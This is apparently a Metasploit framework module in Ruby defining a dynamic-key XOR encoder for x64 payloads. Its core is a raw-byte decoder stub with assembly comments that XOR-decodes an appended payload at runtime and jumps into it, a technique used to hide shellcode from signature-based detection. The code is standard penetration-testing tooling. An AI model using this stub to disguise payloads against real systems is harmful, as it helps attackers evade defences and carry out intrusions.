##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::XorDynamic

  def initialize
    super(
      'Name'             => 'Dynamic key XOR Encoder',
      'Description'      => 'An x64 XOR encoder with dynamic key size',
      'Author'           => [ 'lupman', 'phra' ],
      'Arch'             => ARCH_X64,
      'License'          => MSF_LICENSE
      )
  end

  # Indicate that this module can preserve some registers
  # ...which is currently not true. This is a temp fix
  # until the full preserve_registers functionality is
  # implemented.
  def can_preserve_registers?
    true
  end

  def stub
    "\xeb\x27" +             #        jmp    _call
    "\x5b" +                 # _ret:  pop    rbx
    "\x53" +                 #        push   rbx
    "\x5f" +                 #        pop    rdi
    "\xb0\x41" +             #        mov    al, 'A'
    "\xfc" +                 #        cld
    "\xae" +                 # _lp1:  scas   al, BYTE PTR es:[rdi]
    "\x75\xfd" +             #        jne    _lp1
    "\x57" +                 #        push   rdi
    "\x59" +                 #        pop    rcx
    "\x53" +                 # _lp2:  push   rbx
    "\x5e" +                 #        pop    rsi
    "\x8a\x06" +             # _lp3:  mov    al, BYTE PTR [rsi]
    "\x30\x07" +             #        xor    BYTE PTR [rdi], al
    "\x48\xff\xc7" +         #        inc    rdi
    "\x48\xff\xc6" +         #        inc    rsi
    "\x66\x81\x3f\x42\x42" + #        cmp    WORD PTR [rdi], 'BB'
    "\x74\x07" +             #        je     _jmp
    "\x80\x3e\x41" +         #        cmp    BYTE PTR [rsi], 'A'
    "\x75\xea" +             #        jne    _lp3
    "\xeb\xe6" +             #        jmp    _lp2
    "\xff\xe1" +             # _jmp:  jmp    rcx
    "\xe8\xd4\xff\xff\xff"   # _call: call   _ret
  end

  def stub_key_term
    /A/
  end

  def stub_payload_term
    /BB/
  end
end
